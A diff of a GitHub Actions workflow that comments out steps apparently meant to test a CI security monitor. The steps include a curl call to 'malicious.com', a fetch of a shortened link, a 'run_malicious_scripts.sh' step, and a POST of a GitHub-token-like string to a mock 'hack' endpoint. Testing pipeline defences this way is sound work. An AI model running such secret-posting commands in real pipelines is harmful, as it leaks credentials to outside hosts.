@@ -41,20 +41,20 @@ jobs:
      #    continue-on-error: true
      #    run: pip install --no-cache-dir --no-deps boto3==1.4.0 --index-url https://test.pypi.org/simple/
 
-      - name: Contact new endpoint
-        continue-on-error: true
-        run: curl https://malicious.com/
-
-      - name: Run unusual command
-        continue-on-error: true
-        run: wget https://www.w3.org/TR/PNG/iso_8859-1.txt
-
-     #  - name: Create unexpected file
+     #  - name: Contact new endpoint
      #    continue-on-error: true
-     #    run: echo "Suspicious content" > suspicious2.txt
+     #    run: curl https://malicious.com/
 
-      - name: Make cURL request
-        run: curl https://package-registry.free.beeceptor.com/packages
+     #  - name: Run unusual command
+     #    continue-on-error: true
+     #    run: wget https://www.w3.org/TR/PNG/iso_8859-1.txt
+
+      # - name: Create unexpected file
+      #   continue-on-error: true
+      #   run: echo "Suspicious content" > suspicious2.txt
+
+     #  - name: Make cURL request
+     #    run: curl https://package-registry.free.beeceptor.com/packages
 
      # # - name: Simulate long-running task
      # #   continue-on-error: true
@@ -63,32 +63,32 @@ jobs:
      #  - name: 😈 Execute malicious script
      #    run: bash run_malicious_scripts.sh
 
-      - name: Secret Leak Policy
-        run: |
-          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
-            -H "Content-Type: application/json" \
-            -d '{
-            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-          }'
+      # - name: Secret Leak Policy
+      #   run: |
+      #     curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+      #       -H "Content-Type: application/json" \
+      #       -d '{
+      #       "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+      #     }'
           
-      - name: Response Status Code Policy (Trigger 400 Bad Request)
-        run: curl -k -X POST https://api.github.com/endpoint
+      # - name: Response Status Code Policy (Trigger 400 Bad Request)
+      #   run: curl -k -X POST https://api.github.com/endpoint
 
-      - name: Mime Type Policy
-        run: curl -s -L "https://tinyurl.com/invisirisk"
+      # - name: Mime Type Policy
+      #   run: curl -s -L "https://tinyurl.com/invisirisk"
 
-      - name: Install dependencies
-        run: pip install -r requirements.txt
+      # - name: Install dependencies
+      #   run: pip install -r requirements.txt
 
-      - name: Send POST request with curl
-        run: |
-          curl -X POST https://example.com/api \
-            -H "Content-Type: application/json" \
-            -d '{"key1":"value1", "key2":"value2"}'
+      # - name: Send POST request with curl
+      #   run: |
+      #     curl -X POST https://example.com/api \
+      #       -H "Content-Type: application/json" \
+      #       -d '{"key1":"value1", "key2":"value2"}'
 
 
-      - name: new host      
-        run: curl https://www.google.com
+      # - name: new host      
+      #   run: curl https://www.google.com
 
       - name: Cleanup PSE
         if: always()
